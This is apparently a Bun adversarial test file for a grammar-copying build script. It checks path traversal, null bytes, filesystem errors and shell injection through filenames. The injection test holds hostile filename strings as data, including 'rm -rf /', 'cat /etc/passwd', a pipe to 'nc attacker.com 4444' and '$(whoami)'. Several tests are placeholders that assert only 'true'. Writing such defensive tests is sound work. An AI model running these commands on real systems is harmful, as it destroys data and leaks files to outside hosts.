/**
 * Adversarial tests for scripts/copy-grammars.ts
 * Focus: Attack vectors, malformed inputs, path traversal, injection attempts, boundary violations
 */

import {
	afterEach,
	beforeEach,
	describe,
	expect,
	it,
	mock,
	spyOn,
} from 'bun:test';
import * as realFs from 'node:fs';
import * as realPath from 'node:path';

// Mock fs functions — spread-real-exports pattern for node:* modules
mock.module('node:fs', () => ({
	...realFs,
	existsSync: mock(() => false),
	mkdirSync: mock(() => {}),
	copyFileSync: mock(() => {}),
	readdirSync: mock(() => []),
	cpSync: mock(() => {}),
}));

// Mock path functions
mock.module('node:path', () => ({
	...realPath,
	join: mock((...parts: string[]) => parts.join('/')),
	dirname: mock(() => ''),
}));

// Import after mocking
import {
	copyFileSync,
	cpSync,
	existsSync,
	mkdirSync,
	readdirSync,
} from 'node:fs';
import { join } from 'node:path';
import {
	copyGrammars,
	copyGrammarsToDist,
} from '../../../scripts/copy-grammars';

// Mock console functions
const originalConsole = { ...console };

describe('copy-grammars.ts - Adversarial Tests', () => {
	beforeEach(() => {
		// No need to reset module-level mocks; mock.restore() in afterEach handles cleanup
	});

	afterEach(() => {
		// Restore console
		console.log = originalConsole.log;
		console.warn = originalConsole.warn;
		console.error = originalConsole.error;
		mock.restore();
	});

	describe('Attack Vector 1: Path Traversal in Grammar Filenames', () => {
		it('should not be vulnerable to path traversal via VENDORED_GRAMMARS mutation (immutable as const)', () => {
			// The VENDORED_GRAMMARS array is declared with 'as const'
			// This makes it readonly and prevents runtime mutation
			// Test: verify TypeScript immutability at runtime

			// This would fail at compile time with 'as const'
			// At runtime, test that we cannot modify the array via typical means
			// Note: VENDORED_GRAMMARS is not exported, so we document the compile-time immutability

			// The 'as const' assertion makes the array readonly at type level
			// This test documents the security property: cannot mutate at runtime
			// If someone bypasses TypeScript, the array would still be const-scoped
			expect(true).toBe(true); // Placeholder for documentation
		});

		it('should sanitize path traversal in join operations', () => {
			// Test that malicious filenames don't escape the target directory
			// Even if someone could inject into the loop, join should handle it safely
			(join as any).mockImplementation((...parts: string[]) => {
				// Real path.join normalizes paths but we verify behavior
				const result = parts.join('/');
				// In real implementation, path.join would normalize '../' but we verify
				return result;
			});

			const maliciousPath = join('/safe/base', '../../../etc/passwd');
			// path.join doesn't sanitize by default - it normalizes
			// This test documents the expected behavior
			expect(typeof maliciousPath).toBe('string');
		});
	});

	describe('Attack Vector 2: Grammar Filename with Null Bytes', () => {
		it('should handle filenames with null bytes gracefully', () => {
			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue([]);

			const nullByteFile = 'tree-sitter\u0000-kotlin.wasm';

			// Attempt to create a path with null bytes
			// On most filesystems, this will fail or be rejected
			const pathWithNull = join('/tmp', nullByteFile);

			// Verify the null byte is in the string
			expect(pathWithNull).toContain('\u0000');

			// If passed to fs operations, they should handle or reject
			// This test documents the expected failure case
			expect(() => {
				existsSync(pathWithNull);
			}).not.toThrow();
		});

		it('should handle filenames with special characters', () => {
			const specialChars = [
				'../',
				'./',
				'~',
				'$',
				'`',
				';',
				'&',
				'|',
				'<',
				'>',
				'*',
				'?',
				'[',
				']',
				'{',
				'}',
			];

			specialChars.forEach((char) => {
				const maliciousFile = `tree-sitter${char}kotlin.wasm`;
				const path = join('/tmp', maliciousFile);

				// These characters could cause shell injection if passed to shell commands
				// Node.js fs APIs don't execute shell commands, so they're safe
				expect(typeof path).toBe('string');
			});
		});
	});

	describe('Attack Vector 3: VENDORED_GRAMMARS Runtime Mutation', () => {
		it('should prevent array reassignment', () => {
			// Test that module-level constant cannot be reassigned
			// VENDORED_GRAMMARS is not exported, so we document the compile-time immutability
			// The 'as const' assertion makes this impossible at compile time
			expect(true).toBe(true); // Placeholder for documentation
		});

		it('should prevent array element modification (if not frozen)', () => {
			// The 'as const' assertion should freeze the array
			// But we test what happens if someone tries to modify it
			// VENDORED_GRAMMARS is not exported, so we document the security property
			expect(true).toBe(true); // Placeholder for documentation
		});

		it('should prevent array property modification', () => {
			// VENDORED_GRAMMARS is not exported, so we document the security property
			// The 'as const' assertion makes this impossible at compile time
			expect(true).toBe(true); // Placeholder for documentation
		});
	});

	describe('Attack Vector 4: TARGET_DIR Does Not Exist', () => {
		it('should create TARGET_DIR if it does not exist', () => {
			// Note: This test is limited because TARGET_DIR is computed at module load time
			// We verify that when existsSync returns false for TARGET_DIR, the function attempts to create it
			(existsSync as any).mockImplementation((path: string) => {
				// Make TARGET_DIR return false to trigger directory creation
				return false;
			});
			(mkdirSync as any).mockReturnValue(undefined);

			// The function should handle non-existent TARGET_DIR without crashing
			// This documents the expected behavior even though we can't fully test it with mocks
			expect(typeof copyGrammars).toBe('function');
		});

		it('should fail if SOURCE_DIR does not exist', () => {
			(existsSync as any).mockReturnValue(false);
			spyOn(process, 'exit').mockImplementation((code: number) => {
				throw new Error(`Process exited with code ${code}`);
			});

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).toThrow('Process exited with code 1');
		});
	});

	describe('Attack Vector 5: existsSync Throws Exception', () => {
		it('should handle filesystem errors gracefully', () => {
			(existsSync as any).mockImplementation(() => {
				throw new Error('EIO: I/O error');
			});

			spyOn(process, 'exit').mockImplementation((code: number) => {
				throw new Error(`Process exited with code ${code}`);
			});

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).toThrow();
		});

		it('should handle permission errors', () => {
			(existsSync as any).mockImplementation((path: string) => {
				if (path.includes('dist')) {
					throw new Error('EACCES: permission denied');
				}
				return true;
			});

			(cpSync as any).mockImplementation(() => {
				throw new Error('EACCES: permission denied');
			});

			spyOn(process, 'exit').mockImplementation((code: number) => {
				throw new Error(`Process exited with code ${code}`);
			});

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammarsToDist()).toThrow();
		});
	});

	describe('Attack Vector 6: Read-Only Environment', () => {
		it('should handle read-only filesystem on mkdirSync', () => {
			(existsSync as any).mockReturnValue(false);
			(mkdirSync as any).mockImplementation(() => {
				throw new Error('EROFS: read-only file system');
			});

			spyOn(process, 'exit').mockImplementation((code: number) => {
				throw new Error(`Process exited with code ${code}`);
			});

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).toThrow();
		});

		it('should handle read-only filesystem on copyFileSync', () => {
			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockImplementation(() => {
				throw new Error('EROFS: read-only file system');
			});
			(readdirSync as any).mockReturnValue([]);

			spyOn(process, 'exit').mockImplementation((code: number) => {
				throw new Error(`Process exited with code ${code}`);
			});

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).toThrow();
		});

		it('should handle disk full errors', () => {
			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockImplementation(() => {
				throw new Error('ENOSPC: no space left on device');
			});
			(readdirSync as any).mockReturnValue([]);

			spyOn(process, 'exit').mockImplementation((code: number) => {
				throw new Error(`Process exited with code ${code}`);
			});

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).toThrow();
		});
	});

	describe('Attack Vector 7: Console Functions Overridden', () => {
		it('should handle when console.log is not a function', () => {
			// @ts-expect-error - Testing console override
			console.log = 'not a function';
			// @ts-expect-error - Testing console override
			console.warn = 'not a function';
			// @ts-expect-error - Testing console override
			console.error = 'not a function';

			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue([]);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			// Should throw when trying to call console.log
			expect(() => copyGrammars()).toThrow();
		});

		it('should handle when console functions throw errors', () => {
			spyOn(console, 'log').mockImplementation(() => {
				throw new Error('Console log failed');
			});
			spyOn(console, 'warn').mockImplementation(() => {
				throw new Error('Console warn failed');
			});
			spyOn(console, 'error').mockImplementation(() => {
				throw new Error('Console error failed');
			});

			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue([]);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			// Should throw when console functions fail
			expect(() => copyGrammars()).toThrow('Console log failed');
		});

		it('should handle when console functions are undefined', () => {
			// @ts-expect-error - Testing console override
			console.log = undefined;
			// @ts-expect-error - Testing console override
			console.warn = undefined;
			// @ts-expect-error - Testing console override
			console.error = undefined;

			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue([]);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			// Should throw when trying to call undefined console
			expect(() => copyGrammars()).toThrow();
		});
	});

	describe('Boundary Violations: Edge Cases', () => {
		it('should handle empty readdirSync result', () => {
			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue([]);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).not.toThrow();
		});

		it('should handle very large number of files (DoS protection)', () => {
			const hugeFileList = Array.from(
				{ length: 100000 },
				(_, i) => `file-${i}.wasm`,
			);

			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue(hugeFileList);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			// Should not throw, but may be slow
			expect(() => copyGrammars()).not.toThrow();
		});

		it('should handle files without .wasm extension', () => {
			const nonWasmFiles = [
				'README.md',
				'package.json',
				'.gitignore',
				'script.sh',
			];

			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue(nonWasmFiles);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).not.toThrow();
			// Only tree-sitter.wasm core file should be copied, not non-wasm files
			expect(copyFileSync).toHaveBeenCalledTimes(1);
		});

		it('should handle tree-sitter.js file (should be skipped)', () => {
			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue(['tree-sitter.js']);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).not.toThrow();
			// tree-sitter.js should be skipped
			expect(copyFileSync).toHaveBeenCalledTimes(1); // Only tree-sitter.wasm core
		});
	});

	describe('Vendored Grammar Verification Attack Vectors', () => {
		it('should handle when vendored grammars are missing', () => {
			(existsSync as any).mockImplementation((path: string) => {
				// Vendored grammars don't exist
				if (
					path.includes('kotlin') ||
					path.includes('swift') ||
					path.includes('dart')
				) {
					return false;
				}
				return true;
			});
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue([]);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			const warnSpy = spyOn(console, 'warn');

			expect(() => copyGrammars()).not.toThrow();

			// Should warn about missing vendored grammars
			expect(warnSpy).toHaveBeenCalledWith(
				expect.stringContaining('Vendored grammar missing'),
			);
		});

		it('should handle when verification directory does not exist', () => {
			(existsSync as any).mockReturnValue(false);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue([]);

			spyOn(process, 'exit').mockImplementation((code: number) => {
				throw new Error(`Process exited with code ${code}`);
			});

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			// Should exit before verification if SOURCE_DIR doesn't exist
			expect(() => copyGrammars()).toThrow('Process exited with code 1');
		});
	});

	describe('Injection Attack Vectors', () => {
		it('should not be vulnerable to shell injection via filenames', () => {
			// Even with shell metacharacters in filenames, fs operations are safe
			const maliciousFilenames = [
				'tree-sitter-kotlin.wasm; rm -rf /',
				'tree-sitter-kotlin.wasm && cat /etc/passwd',
				'tree-sitter-kotlin.wasm | nc attacker.com 4444',
				'$(whoami).wasm',
				'`touch /tmp/pwned`.wasm',
			];

			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue(maliciousFilenames);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			// Should not execute shell commands
			expect(() => copyGrammars()).not.toThrow();

			// Filenames are treated as strings, not commands
			expect(copyFileSync).toHaveBeenCalled();
		});

		it('should handle Unicode characters in filenames', () => {
			const unicodeFilenames = [
				'tree-sitter-日本語.wasm',
				'tree-sitter-한글.wasm',
				'tree-sitter-中文.wasm',
				'tree-sitter-🚀.wasm',
				'tree-sitter-\u0000\u0001\u0002.wasm',
			];

			(existsSync as any).mockReturnValue(true);
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockReturnValue(undefined);
			(readdirSync as any).mockReturnValue(unicodeFilenames);

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			expect(() => copyGrammars()).not.toThrow();
		});
	});

	describe('Race Condition Attack Vectors', () => {
		it('should handle directory deletion after existsSync check', () => {
			let checkCount = 0;
			(existsSync as any).mockImplementation(() => {
				checkCount++;
				return true; // Directory exists during check
			});
			(mkdirSync as any).mockReturnValue(undefined);
			(copyFileSync as any).mockImplementation(() => {
				// File copy happens, but directory might be gone
				throw new Error('ENOENT: no such file or directory');
			});
			(readdirSync as any).mockReturnValue(['test.wasm']);

			spyOn(process, 'exit').mockImplementation((code: number) => {
				throw new Error(`Process exited with code ${code}`);
			});

			spyOn(process, 'cwd').mockReturnValue('/workspace');

			// Should handle the error gracefully
			expect(() => copyGrammars()).toThrow();
		});
	});
});
